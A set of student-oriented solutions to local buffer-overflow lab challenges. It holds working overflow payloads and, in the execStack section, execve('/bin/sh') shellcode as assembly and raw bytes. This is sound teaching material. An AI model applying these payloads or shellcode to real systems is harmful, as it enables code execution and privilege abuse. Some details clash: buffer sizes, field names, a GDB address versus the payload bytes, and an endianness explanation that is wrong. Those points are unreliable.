# Solutions 
- This is a list of solutions to various *buffer overflow* challenges. 
- This is meant to ease students into the area, instead of drowning them on redirecting execution right away

## Firsty 
- The buffer is 32 characters long but accepts 0x100 characters. What happens if we write more than 32 characters? In particular, write 32 to get the flag. It's 32 and not 33 because of the NULL byte that gets written.
- The stack is setup in the following way:
	- my_string 
	- special_int 
- So, when the string gets added with more than 16 characters, then **cool_int** is overwritten!
- Simply corrupting this value is enough to pass the challenge.
- python3 -c 'print("A" * 32)' | ./firsty


## Dead 
- A little bit more tricky! 
- The overflow is the same as before, with the same stack setup. The ``my_string`` field of the struct overflows into ``special_int`` after 32 bytes. This is because the string itself is 32 bytes. 
- But, instead, we are using the overflow to **set** the integer value to a specific value! The char array is 32 byets long. Then, the integer is 4 bytes long.
- There are two main tricks to this: 
	- Writing the bytes properly 
	- Endianness
- Writing bytes: 
	- We are trying to write the integer 0xdeadbeef into memory.
	- The hex stream \xef is not a normal character. So, how do we write this? 
	- In Python (Python 2 at least) you can write escaped bytes with hex codes. 
	- Python example: print "\xef" 
		- This would print the literal byte 0xef
	- Common: 
		- Students will try to print the literal 0xdeadbeef. This will not work because this is intertuped as an integer.
- What is endianness? 
	- The ordering in which bytes are organized in memory. x86 is little Endian, meaning that the least significant byte appears first.
	- So, with 0xdeadbeef, we need to write this in the following way: 0xefbeadde. 
	- Remember, we are writing BYTES. 0xef is a SINGLE byte still.
- Final payload:
	- `python3 -c "import sys; sys.stdout.buffer.write(b'A' * 32 + b'\xef\xbe\xad\xde')" | ./dead`
	- Prints the proper bytes (with the Python hex escaping) and prints it in the proper Endinness.

## KillPtr
### Vuln Hunting:
- This is the same vulnerability as the previous challenges: a linear buffer overflow inside the ``danger`` struct from the ``my_string`` field. 
- This time, there is an extra field called ``functionPtr`` on this challenge. We want to corrupt this to change the flow. 
	- It is our goal to edit the *function pointer address* to point to something that we want to call.
- Second, figure out the offset. It's the same 32 bytes as before then an additional 4 for the integer field. 
- Third, go into GDB to figure out the address of the function ``print_flag``. Do this by typing in `disas print_flag`. This will give you an address to jump the flow of the program to, which is 0x8048586. 

### Exploit
- 1. Because the OS's Endian, we need to turn the Big Endian (i.e. 0x80485c3) into little Endian (i.e. 0xc3850408). Notice that this is PER byte. 
- 2. Since we are writing raw values to the stack, we need to use hex code to do this. In order to do this, we must write the characters prefaced with `\x`. So, in the example, turn `0x565556b4` into `\xb4\x56\x55\x56`. Add this value to the payload.
- 3. If all is done right, you should have redirected execution of the program to where the flag is at, displaying the flag.
- 4. My final payload is `python3 -c "import sys; sys.stdout.buffer.write(b'A' * 32 + b'B' * 4 + b'\x56\x88\x04\x08')" | ./killPtr`
	- The exact address will differ from system to system though. 

## CorruptRet
- The concept is the same as the previous challenge for endianness and overflowing a pointer. But, this time, we are overwritting the EIP (instruction pointer) of the location. 
- The stack contains other important data relating to the previous stack frame: base pointer, stack pointer and instruction pointer. 
- If we can change the instruction pointer to be ``print_flag()`` then we can redirect the flow of execution! 
- The overflowing into the ``int`` is 32 bytes. 4 bytes through the int. Then, we have to care about the rest of the information on the stack. 
- Difference between ``&my_data`` and the location of the old IP is (0xffffd65c - 0xffffd62c) = 0x30. This is a total of 12 bytes more until the overflow. 
	- When ``leave()`` is called, this puts in the proper ebp from the previous frame is recovered. Additionally, there are two other bytes there that I am not sure about. 
	- The best way to find this offset is to *pause* at the first instruction of the function. 
	- Then, look at the stack pointer and you'll see the old EIP.
	- Compare this with the pointer to ``&my_data``. 
	- Subtract these pointers to get the amount of bytes to write. 
- Overflowing for 0x30 bytes will get us to the EIP. 
- Set this to the address of ``print_flag()`` like the previous challenge to get the flag.

```
python3 -c "import sys; sys.stdout.buffer.write(b'A' * 32 + b'B' * 4 + b'C' * 12 + b'\x56\x88\x04\x08')" | ./corruptRet
```

## execStack 
- Without an easy *win* function, we need to pop a shell on our own!
- Since the stack is executable, we can put our own code onto the stack and run that. But how!? 
	- The key to this is writing raw machine code. 
- We can put the raw machine code into the beginning of our input. Then, overwrite the return address (like the previous challenge) to jump to our machine code instead. 
	- The address of the machine code is printed at away in the program. 
	- Makes it obvious to see what's going on :) 
- You can find machine code (shellcode) online that works pretty quickly to pop a shell.
- A few tricks: 
	- Shellcode: 
		- Literally pops a shell.
		- Calling the syscall ``execve`` with ``/bin/sh`` as the parameters.
		```
		xor    %eax,%eax    -- Clean EAX to use as NULL
		push   %eax	        -- Push a null byte
		push   $0x68732f2f  -- Push part of /bin/sh
		push   $0x6e69622f  -- Push another part of /bin/sh
		mov    %esp,%ebx    -- Param 1 - binary to execute
		push   %eax         
		push   %ebx 
		mov    %esp,%ecx    -- Param 2 - Path of execution
		mov    $0xb,%al     -- The syscall (11) for execve
		int    $0x80        -- syscall interrupt
		```
		- https://shell-storm.org/shellcode/files/shellcode-827.html
	- Keeping the pipe open: 
		- The way we give input is SUPER important...if we don't have a way to interact with it, the code will DROP our input. 
		- So, we must have the extra ``cat -`` at the end of it. 
	- Stack pointer address will *differ* slightly between GDB and the live one. Keep this in mind.
- Shenanigans of the challenge: 
	- ``/bin/sh`` goes back to the original uid instead of the euid. So, we have to find a way to get the proper permissions for this...
		- This is done by becoming root then dropping the permissions to a user in the group that can read the flag. 
		- Now, the uid is the set and the shell will have the proper permissions. 
	- Clear edx: 
		- There is a short bit of assembler in the code...
		- This is because 'edx' being set to a non-null value screws everything up, since it acts as the third parameters ``envp``. 
		- Hence, we clear ``edx`` to make everyone's life easier. 
	- ASLR is turned off - so, the address can be static. It's even printed out to make our lives easier. 

```
(python3 -c "import sys; sys.stdout.buffer.write(b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + b'A' * (-23 + 32 + 4 + 12) + b'\x7c\xd6\xff\xff\x0A' + b'whoami')"; cat -) | ./execStack
```

What's going on!? 
- setuid is not working as expected on a forked call... 'system' doesn't inherit permissions from setuid. Probably a good thing! But... I've never seen this before!
- https://stackoverflow.com/questions/16258830/does-system-syscall-drop-privileges

### Further explanation:
- How the stack works:
    - On load of a function, the function address is pushed, followed by ebp then local variables (if needed).
    - Last on, first off style.
- Little Endian vs Big Endian:
    - https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/ass15_3.html
    - The location of the significance of the value. Most general number systems are little Endian (little end first) 1234 would be 1 x10^3+ 2x10^2 + 3x10^1 + 4x10^0 for instance. Big Endian would be 4x10^3....
- gdb:
    - This is a debugger
    - https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf
